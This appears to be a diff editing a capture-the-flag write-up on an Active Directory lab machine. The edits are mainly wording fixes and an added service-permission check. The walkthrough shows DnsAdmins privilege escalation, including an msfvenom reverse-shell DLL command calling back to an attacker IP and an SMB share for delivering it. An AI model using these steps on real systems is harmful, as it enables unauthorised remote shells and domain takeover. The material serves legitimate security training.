@@ -52,7 +52,7 @@ index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: 
 index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
 ```
 
-The most juicy bit of information a password that looks like a default password set upon account creation.
+The most juicy bit of information is a password that looks like a default password set upon account creation.
 
 Trying the password with the username `marko` on both SMB and WinRM was not fruitful.
 
@@ -171,7 +171,9 @@ We got in!
 
 ## Privilege Escalation From DNSAdmins
 
-As part of our enumeration, we uncover that `ryan` is part of the `DnsAdmins` group. Some research reveals that it's possible to perform [privilege escalation](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) from this group.
+As part of our enumeration, we uncover that `ryan` is part of the `DnsAdmins` group. 
+
+Some research reveals that it's possible to perform [privilege escalation](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) from this group.
 
 ```
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
@@ -202,13 +204,33 @@ These are the steps:
 3. Prepare a handler.
 4. Restart the server to load the DLL.
 
+A critical requirement of this exploitation requires us to restart the DNS service to load the DLL payload. Hence, let's ascertain that our account has the permissions to do so.
+
+```
+*Evil-WinRM* PS C:\Users\ryan\music> .\accesschk.exe /accepteula -ucqv dns
+dns
+  Medium Mandatory Level (Default) [No-Write-Up]
+<SNIP>
+  R  MEGABANK\ryan
+        SERVICE_QUERY_STATUS
+        SERVICE_INTERROGATE
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+Yes, the user ryan has the ability to SERVICE_START and SERVICE_STOP.
+
+Now, let's move onto the exploitation.
+
 First, let's use `msfvenom` to create a DLL payload.
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=8888 --platform=windows -f dll > plugin.dll`
 
 Next, let's change the DNS server configuration to point to the DLL.
 
-We will infiltrate the DLL with Impacket's `smbserver`. Use the command below in a local folder that contains `plugin.dll`.
+We will infiltrate the DLL with the help of Impacket's `smbserver`. Use the command below in a local folder that contains `plugin.dll`.
 
 `impacket-smbserver SHARE .`
 
